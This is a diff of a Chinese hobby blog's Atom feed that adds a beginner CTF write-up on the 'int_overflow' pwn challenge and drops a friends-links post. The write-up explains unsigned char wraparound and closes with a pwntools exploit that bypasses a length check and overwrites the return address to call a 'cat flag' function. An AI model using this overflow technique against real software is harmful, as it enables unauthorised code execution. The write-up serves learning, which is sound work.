@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-06-01T03:15:14.375Z</updated>
+    <updated>2020-06-01T14:12:58.822Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,89 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[攻防世界pwn新手区—int_overflow]]></title>
+        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/</id>
+        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
+        </link>
+        <updated>2020-06-01T12:43:12.000Z</updated>
+        <content type="html"><![CDATA[<p>听名字就是整数溢出<br>
+先学习下什么是整数溢出</p>
+<h1 id="整数溢出知识">整数溢出知识</h1>
+<p>看那种官方的说明看的头大，直接说说我对整数溢出的理解emm<br>
+整数溢出，顾名思义就是整数溢出来了，什么是“溢出来”，就是256 = 0，65536 = 0 之类的<br>
+我们看个例子  我们在c语言中，用char定义一个变量c，用来存放一个1字节8个二进制位的数据<br>
+现在的书本也好，教师也好，总喜欢把char讲成定义字符型变量，其实不是的，char来定义变量的时候，本质就是为一个变量开辟一个字节的内存用来存放数据，这一个字节的空间是由我们任意支配的，想存什么类型的数据都可以，只不过大家都习惯存字符型的而已，跑题了（</p>
+<pre><code class="language-c">char c = 1;
+</code></pre>
+<p>那么在内存中就是 0000 0001<br>
+如果是c = -1<br>
+那么在内存中就是 1000 0001<br>
+1代表符号位<br>
+那么思考下，c可存储的范围是多少呢？ 是 -128—127<br>
+如果c = 127，即 0111 1111 那么c = c+1，再打印一下c是多少呢？<br>
+<img src="https://zhangzy999.github.io//post-images/1591016175946.png" alt="" loading="lazy"><br>
+神奇的事情发生了，打印出来是-128，其实也不神奇，因为0111 1111 + 0000 0001 = 1000 0000  = -128<br>
+<img src="https://zhangzy999.github.io//post-images/1591016444486.png" alt="" loading="lazy"><br>
+如果是无符号类型的话，表示的范围就是0—255<br>
+我们看代码</p>
+<pre><code class="language-c">unsigned char c = 256;
+printf(&quot;%d\n&quot;,c);
+</code></pre>
+<p>这样又会变成什么呢？思考一下 256 = 255 + 1<br>
+也就是 1111 1111 + 1 结果等于 (0001)0000 0000 然而我们内存只给它开辟了一个字节的空间，所以结果会等于零，dev上运行一下看看<br>
+<img src="https://zhangzy999.github.io//post-images/1591016989930.png" alt="" loading="lazy"><br>
+这就是整数溢出的原理，这是最简单的unsigned char情况，对于word，dword情况也一样</p>
+<h1 id="解题">解题</h1>
+<h2 id="题目分析">题目分析</h2>
+<p>我们运行一下程序看看是什么情况<br>
+<img src="https://zhangzy999.github.io//post-images/1591018218857.png" alt="" loading="lazy"><br>
+简单的一个模拟登录的功能，接着我们查看一下开启了哪些保护机制<br>
+<img src="https://zhangzy999.github.io//post-images/1591018245408.png" alt="" loading="lazy"><br>
+栈不可执行保护被打开了，我们直接IDA来看看main函数叭<br>
+<img src="https://zhangzy999.github.io//post-images/1591018283129.png" alt="" loading="lazy"><br>
+我们跟进去login函数<br>
+<img src="https://zhangzy999.github.io//post-images/1591018316958.png" alt="" loading="lazy"><br>
+有一个check密码的函数，我们跟进去看看<br>
+<img src="https://zhangzy999.github.io//post-images/1591018361068.png" alt="" loading="lazy"><br>
+发现strcpy函数，这个函数可能会存在溢出，发现是把s赋给dest，而s的空间又大于dest，所以存在溢出（s即我们在login函数里面传入的参数buf），但是关键是上面有一个判断长度的if判断语句，所以我们得想办法来绕过if判断<br>
+看到v3是unsigned char类型的（即IDA中的unsigned __int8），要求v3在4—8之间<br>
+根据之前讲解的就可以使用整数溢出来绕过if判断<br>
+256 = 0，那么260 = 4，目标明确了，然后找偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1591020302218.png" alt="" loading="lazy"><br>
+奈斯，然后发现一个奇奇怪怪的函数<br>
+<img src="https://zhangzy999.github.io//post-images/1591020348124.png" alt="" loading="lazy"><br>
+奈斯，然后找到cat flag的地址<br>
+<img src="https://zhangzy999.github.io//post-images/1591020376308.png" alt="" loading="lazy"><br>
+万事具备，只欠exp</p>
+<h2 id="exp编写">exp编写</h2>
+<pre><code class="language-python">from pwn import *
+
+ip = '124.126.19.106'
+port = '37599'
+r = remote(ip,port)
+
+system_addr = 0x08048694
+offset = 0x14 + 0x4    #加4是覆盖原函数的ebp的值
+p32_system_addr = 0x4    #这个是p32发过去system的地址所占的4个字节，在整数溢出的时候要注意一下这个点    
+unsigned_int_flow = 260 - offset - p32_system_addr    
+
+payload = 'A' * offset + p32(system_addr) + 'A' * unsigned_int_flow
+
+r.recvuntil('Your choice:')
+r.sendline('1')
+
+r.recvuntil('Please input your username:')
+r.sendline('Hello')
+
+r.recvuntil('Please input your passwd:')
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>然后就是flag辣，奈斯<br>
+<img src="https://zhangzy999.github.io//post-images/1591020622027.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[攻防世界pwn新手区—guess_num]]></title>
         <id>https://zhangzy999.github.io/post/ad5_guess_num/</id>
@@ -502,22 +585,6 @@ while True:
 </code></pre>
 <p>然后就是flag辣<br>
 <img src="https://zhangzy999.github.io//post-images/1588822875045.PNG" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[日常生活—大佬们的博客地址]]></title>
-        <id>https://zhangzy999.github.io/post/dalaoboke/</id>
-        <link href="https://zhangzy999.github.io/post/dalaoboke/">
-        </link>
-        <updated>2020-04-28T15:09:28.000Z</updated>
-        <content type="html"><![CDATA[<p>七星<br>
-友链：<a href="http://qixingnet.top/">http://qixingnet.top/</a><br>
-堆堆<br>
-友链：<a href="https://duitutu.cn">https://duitutu.cn</a><br>
-魔法少女雪殇<br>
-友链：<a href="http://z.mofalongmao.xyz/wordpress/">http://z.mofalongmao.xyz/wordpress/</a><br>
-R1v0ir<br>
-友链：<a href="https://r1v0ir.github.io/">https://r1v0ir.github.io/</a></p>
 ]]></content>
     </entry>
 </feed>
